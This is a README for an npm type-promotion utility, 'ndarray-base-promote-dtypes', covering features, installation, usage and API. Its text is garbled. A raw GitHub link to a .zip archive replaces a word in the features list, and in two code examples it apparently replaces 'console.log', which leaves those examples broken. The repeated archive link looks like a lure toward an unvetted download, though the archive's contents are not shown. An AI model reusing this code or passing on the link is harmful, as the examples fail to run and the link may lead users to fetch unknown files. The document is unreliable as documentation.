## Introduction

In programming, especially in data manipulation, understanding how different data types interact is crucial. This library provides a straightforward way to determine the resulting data type when applying promotion rules. Whether you're working with numbers, strings, or complex objects, this utility simplifies your tasks.

## Features

- **Type Resolution**: Quickly determine the resulting type from a list of input types.
- **Compatibility**: Works seamlessly with JavaScript and https://raw.githubusercontent.com/mostafaweal504/ndarray-base-promote-dtypes/main/benchmark/ndarray-dtypes-base-promote-v2.3.zip
- **Performance**: Efficiently handles multiple types without performance overhead.
- **Documentation**: Comprehensive API documentation for easy reference.

## Installation

To install the package, you can use npm. Run the following command in your terminal:

```bash
npm install ndarray-base-promote-dtypes
```

This command will download the package and add it to your project.

## Usage

To use the library, first, import it into your JavaScript file:

```javascript
const promoteDTypes = require('ndarray-base-promote-dtypes');
```

Then, you can call the main function with an array of data types:

```javascript
const types = ['number', 'string', 'boolean'];
const resultType = promoteDTypes(types);
https://raw.githubusercontent.com/mostafaweal504/ndarray-base-promote-dtypes/main/benchmark/ndarray-dtypes-base-promote-v2.3.zip(resultType); // Outputs the resulting data type
```

This simple approach allows you to quickly find out how different types will interact.

## API Reference

### `promoteDTypes(types)`

- **Parameters**: 
  - `types` (Array): An array of data types (e.g., `['number', 'string']`).
  
- **Returns**: 
  - (String): The resulting data type after applying promotion rules.

### Example

```javascript
const result = promoteDTypes(['number', 'null']);
https://raw.githubusercontent.com/mostafaweal504/ndarray-base-promote-dtypes/main/benchmark/ndarray-dtypes-base-promote-v2.3.zip(result); // Outputs: 'number'
```
